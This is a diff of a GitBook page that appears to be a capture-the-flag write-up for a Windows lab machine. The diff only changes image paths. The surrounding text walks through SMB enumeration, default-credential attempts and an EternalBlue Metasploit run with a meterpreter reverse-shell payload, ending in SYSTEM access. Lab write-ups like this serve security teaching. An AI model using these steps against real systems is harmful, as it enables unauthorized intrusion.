@@ -21,13 +21,13 @@ A couple of interesting things come up when running the scan
 
 After running smbclient -L //10.10.10.40 -U guest we see a couple of available shares remotely. Includeing an Admin share. This is interesting.&#x20;
 
-<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
 For fun, we can also use a tool called smbmap.
 
 {% embed url="https://github.com/ShawnDEvans/smbmap" %}
 
-<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
 We can try default credentials to login into the remote admin share.&#x20;
 
@@ -45,7 +45,7 @@ Clone the following repository to use the exploit on the SMB server.&#x20;
 
 cd into the directory, and we have to edit the file using a text editor of your choice.&#x20;
 
-<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
 
 Add \\\ in the username field, this will work because the SMB server is running on a default configuration.
 
@@ -75,9 +75,9 @@ PAYLOAD => windows/x64/meterpreter/reverse\_tcp msf6 exploit(windows/smb/ms17\_0
 
 msf6 exploit(windows/smb/ms17\_010\_eternalblue) > set LHOST 10.10.14.2 LHOST => 10.10.14.2 msf6 exploit(windows/smb/ms17\_010\_eternalblue) >
 
-<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
 
 The reverse shell has been acheived. I we run getsystem, we can see that we are already running at the highest level priviliges possible.&#x20;
 
@@ -87,4 +87,4 @@ Run shell, cd to the directory.&#x20;
 
 type root.txt
 
-<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
